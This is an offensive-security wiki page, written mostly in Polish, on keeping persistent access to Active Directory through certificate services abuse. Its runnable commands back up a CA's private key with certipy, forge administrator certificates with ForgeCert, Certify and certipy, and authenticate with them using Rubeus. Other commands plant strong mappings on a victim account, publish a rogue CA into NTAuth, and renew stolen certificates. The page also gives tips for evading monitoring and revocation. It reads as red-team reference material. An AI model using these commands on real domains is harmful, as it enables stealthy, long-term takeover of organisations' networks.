# AD CS Utrzymanie dostępu w domenie

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Fałszowanie certyfikatów za pomocą skradzionych certyfikatów CA (Golden Certificate) - DPERSIST1

Jak rozpoznać, że certyfikat jest certyfikatem CA?

Można stwierdzić, że certyfikat jest certyfikatem CA, jeśli spełnionych jest kilka warunków:

- Certyfikat jest przechowywany na serwerze CA, a jego klucz prywatny zabezpieczony przez DPAPI maszyny lub przez hardware taki jak TPM/HSM, jeśli system operacyjny to obsługuje.
- Pola Issuer i Subject certyfikatu odpowiadają wyróżnionej nazwie (distinguished name) CA.
- Rozszerzenie "CA Version" występuje wyłącznie w certyfikatach CA.
- Certyfikat nie zawiera pól Extended Key Usage (EKU).

Aby wyeksportować klucz prywatny tego certyfikatu, wspieranym sposobem jest użycie narzędzia `certsrv.msc` na serwerze CA poprzez wbudowany interfejs GUI. Niemniej jednak certyfikat ten nie różni się od innych przechowywanych w systemie; w związku z tym do jego pozyskania można zastosować metody takie jak [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Certyfikat i klucz prywatny można również uzyskać przy użyciu Certipy za pomocą następującego polecenia:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Po pozyskaniu certyfikatu CA i jego klucza prywatnego w formacie `.pfx`, narzędzia takie jak [ForgeCert](https://github.com/GhostPack/ForgeCert) mogą być użyte do wygenerowania ważnych certyfikatów:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Użytkownik będący celem fałszowania certyfikatu musi być aktywny i zdolny do uwierzytelnienia w Active Directory, aby proces się powiódł. Fałszowanie certyfikatu dla specjalnych kont takich jak krbtgt jest nieskuteczne.

Ten sfałszowany certyfikat będzie **ważny** do określonej daty końcowej oraz tak długo, jak ważny jest certyfikat root CA (zwykle od 5 do **10+ lat**). Jest on również ważny dla **maszyn**, więc w połączeniu z **S4U2Self** atakujący może **maintain persistence on any domain machine** tak długo, jak ważny jest certyfikat CA.\
Ponadto **certyfikaty wygenerowane** tą metodą **nie mogą zostać odwołane**, ponieważ CA nie jest o nich świadome.

### Działanie w warunkach Strong Certificate Mapping Enforcement (2025+)

Od 11 lutego 2025 (po wdrożeniu KB5014754) kontrolery domeny domyślnie stosują **Full Enforcement** dla mapowań certyfikatów. W praktyce oznacza to, że twoje sfałszowane certyfikaty muszą albo:

- Zawierać silne powiązanie z kontem docelowym (na przykład SID security extension), lub
- Być sparowane z silnym, wyraźnym mapowaniem na atrybucie `altSecurityIdentities` obiektu docelowego.

Niezawodnym podejściem do persistence jest wyemitowanie sfałszowanego certyfikatu powiązanego z skradzionym Enterprise CA, a następnie dodanie silnego, wyraźnego mapowania do victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Jeśli możesz stworzyć forged certificates, które zawierają rozszerzenie SID security extension, będą one mapowane implicitnie nawet przy Full Enforcement. W przeciwnym razie preferuj explicit strong mappings. Zobacz [account-persistence](account-persistence.md) aby dowiedzieć się więcej o explicit mappings.
- Unieważnienie nie pomaga obrońcom: forged certificates są nieznane w CA database i w związku z tym nie można ich unieważnić.

#### Full-Enforcement compatible forging (SID-aware)

Zaktualizowane narzędzia pozwalają osadzić SID bezpośrednio, dzięki czemu golden certificates pozostają użyteczne nawet gdy DCs odrzucają weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Osadzając SID unikasz konieczności modyfikowania `altSecurityIdentities`, które mogą być monitorowane, jednocześnie nadal spełniając rygorystyczne kontrole mapowania.

## Trusting Rogue CA Certificates - DPERSIST2

Obiekt `NTAuthCertificates` jest przeznaczony do przechowywania jednego lub więcej **certyfikatów CA** w swoim atrybucie `cacertificate`, których używa Active Directory (AD). Proces weryfikacji przeprowadzany przez **kontroler domeny** polega na sprawdzeniu obiektu `NTAuthCertificates` w poszukiwaniu wpisu odpowiadającego **CA wskazanemu** w polu Issuer uwierzytelniającego **certyfikatu**. Uwierzytelnianie jest kontynuowane, jeśli znaleziono dopasowanie.

Samopodpisany certyfikat CA może zostać dodany do obiektu `NTAuthCertificates` przez atakującego, o ile ma on kontrolę nad tym obiektem AD. Zazwyczaj tylko członkowie grupy **Enterprise Admin**, wraz z **Domain Admins** lub **Administrators** w **forest root’s domain**, mają uprawnienia do modyfikacji tego obiektu. Mogą edytować obiekt `NTAuthCertificates` przy użyciu `certutil.exe` poleceniem `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, lub korzystając z [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatkowe przydatne polecenia dla tej techniki:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ta możliwość jest szczególnie istotna, gdy jest używana razem z wcześniej opisanym sposobem wykorzystującym ForgeCert do dynamicznego generowania certyfikatów.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Złośliwa konfiguracja - DPERSIST3

Możliwości uzyskania **utrzymania dostępu** poprzez modyfikacje security descriptor komponentów AD CS jest wiele. Modyfikacje opisane w sekcji "[Domain Escalation](domain-escalation.md)" mogą być złośliwie wprowadzone przez atakującego z podwyższonym dostępem. Obejmuje to dodanie "control rights" (np. WriteOwner/WriteDACL/etc.) do wrażliwych komponentów, takich jak:

- Obiekt **CA server’s AD computer**
- **CA server’s RPC/DCOM server**
- Dowolny **descendant AD object or container** w **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** domyślnie lub nadane przez organizację (such as the built-in Cert Publishers group and any of its members)

Przykład złośliwej implementacji obejmowałby atakującego, który ma **podwyższone uprawnienia** w domenie i dodaje uprawnienie **`WriteOwner`** do domyślnego szablonu certyfikatu **`User`**, przypisując sobie principal tego prawa. Aby to wykorzystać, atakujący najpierw zmieniłby właściciela szablonu **`User`** na siebie. Następnie na szablonie ustawiono by **`mspki-certificate-name-flag`** na **1**, aby włączyć **`ENROLLEE_SUPPLIES_SUBJECT`**, co pozwala użytkownikowi dostarczyć Subject Alternative Name w żądaniu. W dalszej kolejności atakujący mógłby **enroll** używając szablonu, wybierając nazwę domain administrator jako alternatywną nazwę i użyć zdobytego certyfikatu do uwierzytelnienia jako DA.

Praktyczne ustawienia, które atakujący mogą skonfigurować dla długoterminowego utrzymania dostępu w domenie (zob. {{#ref}}domain-escalation.md{{#endref}} po pełne szczegóły i wykrywanie):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> W zahartowanych środowiskach po KB5014754, łączenie tych błędnych konfiguracji z jawnymi silnymi mapowaniami (`altSecurityIdentities`) zapewnia, że wydane lub sfałszowane certyfikaty pozostaną użyteczne nawet gdy DCs wymuszają silne mapowanie.

### Certificate renewal abuse (ESC14) for persistence

Jeśli przejmiesz certyfikat zdolny do uwierzytelniania (lub certyfikat Enrollment Agent), możesz odnawiać go w nieskończoność tak długo, jak szablon wydający pozostaje opublikowany i Twoja CA nadal ufa łańcuchowi wystawców. Odnowienie zachowuje pierwotne powiązania tożsamości, ale wydłuża ważność, co utrudnia usunięcie, chyba że naprawi się szablon lub CA zostanie ponownie opublikowana.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Jeśli kontrolery domeny są w trybie **Pełnego wymuszania**, dodaj `-sid <victim SID>` (lub użyj szablonu, który nadal zawiera rozszerzenie bezpieczeństwa SID), aby odnowiony certyfikat końcowy nadal był silnie powiązany z kontem bez modyfikowania `altSecurityIdentities`. Atakujący z uprawnieniami administratora CA mogą także dostosować `policy\RenewalValidityPeriodUnits`, aby wydłużyć okresy ważności odnowionych certyfikatów, zanim wystawią sobie certyfikat.

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
